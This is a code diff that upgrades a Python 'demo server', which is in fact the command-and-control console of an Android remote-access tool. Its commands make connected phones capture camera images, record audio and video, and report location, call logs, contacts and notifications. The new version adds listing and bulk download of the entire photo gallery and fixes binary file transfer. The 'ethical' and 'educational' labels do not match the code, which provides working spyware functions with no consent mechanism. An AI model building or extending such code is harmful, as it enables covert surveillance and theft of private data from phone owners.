@@ -1,17 +1,19 @@
 #!/usr/bin/env python3
 """
-Ethical Android Device Demo Server - Version 4.0
+Ethical Android Device Demo Server - Version 5.0
 For educational purposes only - demonstrates legitimate client-server communication
 with improved reliability, better logging, and enhanced user experience.
 
-v4.0 New Features:
-- Call logs command (get_call_logs)
-- Contacts command (get_contacts)
-- File browser commands (list_files, get_storage_info, download_file)
-- Video recording command (record_video)
-- Notification reading (get_notifications, live notification forwarding)
-- Enhanced stats and logging
-- Better session management
+v5.0 New Features:
+- Gallery list with item IDs (get_gallery_list)
+- Download specific gallery item by ID (download_gallery_item <id>)
+- Download ALL gallery items (download_gallery)
+- Fixed binary file receiving (download_file now works)
+- Fixed gallery_list vs file_list type collision
+- Optimized file transfer protocol with proper delays
+
+v4.0 Features:
+- Call logs, contacts, file browser, video recording, notifications
 """
 
 import socket
@@ -161,7 +163,7 @@ class DemoServer:
             self.running = True
 
             self.log("=" * 60)
-            self.log("  ANDROID DEVICE DEMO SERVER - VERSION 4.0")
+            self.log("  ANDROID DEVICE DEMO SERVER - VERSION 5.0")
             self.log("  Educational Purpose Only")
             self.log("=" * 60)
             self.log(f"[+] Server listening on {self.host}:{self.port}")
@@ -279,11 +281,29 @@ class DemoServer:
                     self.send_command_to_all(custom_cmd, args_json)
 
                 # === v2.0/v3.0 Commands ===
-                elif command in ["download_gallery", "take_photo", "get_location",
-                                 "get_file_list", "record_audio", "get_app_list",
+                elif command in ["take_photo", "get_location",
+                                 "record_audio", "get_app_list",
                                  "get_device_info", "heartbeat",
                                  "capture_front", "capture_back"]:
                     self.send_command_to_all(command)
+
+                # === v5.0 Gallery Commands ===
+                elif command == "get_gallery_list":
+                    self.send_command_to_all("get_gallery_list")
+
+                elif command == "download_gallery_item":
+                    if len(parts) < 2:
+                        print("Usage: download_gallery_item <item_id>")
+                        continue
+                    args = json.dumps({"item_id": parts[1]})
+                    self.send_command_to_all("download_gallery_item", args)
+
+                elif command == "download_gallery":
+                    # Download ALL gallery items
+                    self.send_command_to_all("download_gallery")
+
+                elif command == "get_file_list":
+                    self.send_command_to_all("get_file_list")
 
                 # === v4.0 NEW Commands ===
                 elif command == "get_call_logs":
@@ -338,39 +358,42 @@ class DemoServer:
     def show_help(self):
         """Show available commands"""
         print("\n" + "=" * 60)
-        print("  ANDROID DEVICE DEMO SERVER v4.0 - AVAILABLE COMMANDS")
+        print("  ANDROID DEVICE DEMO SERVER v5.0 - AVAILABLE COMMANDS")
         print("=" * 60)
         print("\n  --- v2.0/v3.0 Commands ---")
-        print("  1.  download_gallery   - Request image from gallery")
-        print("  2.  take_photo         - Request camera capture (legacy)")
-        print("  3.  get_location       - Request GPS coordinates")
-        print("  4.  get_file_list      - Request gallery file list")
-        print("  5.  record_audio       - Request 5s audio recording")
-        print("  6.  get_app_list       - Request installed apps list")
-        print("  7.  get_device_info    - Request device information")
-        print("  8.  capture_front      - Request front camera capture")
-        print("  9.  capture_back       - Request rear camera capture")
-        print("\n  --- v4.0 NEW Commands ---")
-        print("  10. get_call_logs      - Request device call history")
-        print("  11. get_contacts       - Request contacts list")
-        print("  12. list_files [path]  - Browse files on device")
-        print("  13. get_storage_info   - Get device storage info")
-        print("  14. download_file <p>   - Download a specific file")
-        print("  15. record_video [s] [front|back] - Record video clip")
-        print("  16. get_notifications  - Get recent notifications")
+        print("  1.  take_photo         - Request camera capture (legacy)")
+        print("  2.  get_location       - Request GPS coordinates")
+        print("  3.  record_audio       - Request 5s audio recording")
+        print("  4.  get_app_list       - Request installed apps list")
+        print("  5.  get_device_info    - Request device information")
+        print("  6.  capture_front      - Request front camera capture")
+        print("  7.  capture_back       - Request rear camera capture")
+        print("\n  --- v5.0 Gallery Commands ---")
+        print("  8.  get_gallery_list   - List gallery items with IDs")
+        print("  9.  download_gallery_item <id> - Download specific gallery item")
+        print("  10. download_gallery    - Download ALL gallery items")
+        print("  11. get_file_list      - Request gallery file list (legacy)")
+        print("\n  --- v4.0 Commands ---")
+        print("  12. get_call_logs      - Request device call history")
+        print("  13. get_contacts       - Request contacts list")
+        print("  14. list_files [path]  - Browse files on device")
+        print("  15. get_storage_info   - Get device storage info")
+        print("  16. download_file <p>  - Download a specific file")
+        print("  17. record_video [s] [front|back] - Record video clip")
+        print("  18. get_notifications  - Get recent notifications")
         print("\n  --- Server Commands ---")
-        print("  17. list_devices       - Show connected devices")
-        print("  18. stats              - Show server statistics")
-        print("  19. send <cmd> [json]  - Send custom command with args")
-        print("  20. help               - Show this help")
-        print("  21. quit               - Stop server")
+        print("  19. list_devices       - Show connected devices")
+        print("  20. stats              - Show server statistics")
+        print("  21. send <cmd> [json]  - Send custom command with args")
+        print("  22. help               - Show this help")
+        print("  23. quit               - Stop server")
         print("=" * 60)
 
     def show_stats(self):
         """Show server statistics"""
         self.update_stats()
         print("\n" + "=" * 60)
-        print("  SERVER STATISTICS v4.0")
+        print("  SERVER STATISTICS v5.0")
         print("=" * 60)
         uptime = self.stats.get('uptime', 0)
         print(f"  Uptime: {uptime:.0f}s ({uptime/3600:.1f}h)")
@@ -507,7 +530,7 @@ class DemoServer:
                                 session.client_socket.send(ack)
                                 session.device_info.pop("pending_file", None)
                         else:
-                            # We are expecting JSON
+                            # We are expecting JSON — try to decode one message
                             try:
                                 chunk_str = combined[idx:].decode('utf-8')
                                 decoder = json.JSONDecoder()
@@ -516,11 +539,18 @@ class DemoServer:
                                 # Process JSON message
                                 self.handle_json_message(session, message)
 
-                                # Move idx forward
+                                # Move idx forward by the byte length of the parsed JSON
                                 json_bytes_len = len(chunk_str[:end_pos].encode('utf-8'))
                                 idx += json_bytes_len
-                            except (json.JSONDecodeError, UnicodeDecodeError):
-                                # Incomplete JSON - wait for more data
+                            except json.JSONDecodeError:
+                                # Incomplete JSON — save remainder, wait for more data
+                                remainder = combined[idx:]
+                                idx = len(combined)
+                            except UnicodeDecodeError:
+                                # Binary data where we expected JSON — this means
+                                # a file_transfer_start was received but pending_file
+                                # wasn't set (race or missed). Treat remaining bytes
+                                # as raw and re-process on next recv.
                                 remainder = combined[idx:]
                                 idx = len(combined)
                 except ConnectionResetError:
@@ -572,13 +602,18 @@ class DemoServer:
             self.log(f"    Accuracy: {acc}m")
             self.log_to_file(message, session.address)
 
-        elif msg_type == "file_list":
+        elif msg_type == "gallery_list":
             files = message.get("files", [])
-            self.log(f"[i] Gallery file list from session {session.session_id} ({len(files)} files):")
+            self.log(f"[i] Gallery file list from session {session.session_id} ({len(files)} items):")
             for f in files[:20]:
-                self.log(f"    - {f}")
+                self.log(f"    - [{f.get('id', '?')}] {f.get('name', '?')} ({f.get('size', 0)} bytes)")
             if len(files) > 20:
                 self.log(f"    ... and {len(files) - 20} more")
+            # Save gallery list to file
+            gallery_file = os.path.join(DOCS_DIR, f"gallery_list_{session.session_id}_{int(time.time())}.json")
+            with open(gallery_file, 'w') as f:
+                json.dump(files, f, indent=2)
+            self.log(f"    [+] Saved to: {gallery_file}")
             self.log_to_file(message, session.address)
 
         elif msg_type == "app_list":
@@ -677,7 +712,7 @@ class DemoServer:
             self.log_to_file(message, session.address)
 
         elif msg_type == "file_list":
-            # File browser results (different from gallery file_list)
+            # File browser results (from list_files command)
             files = message.get("files", [])
             path = message.get("path", "")
             count = message.get("count", 0)
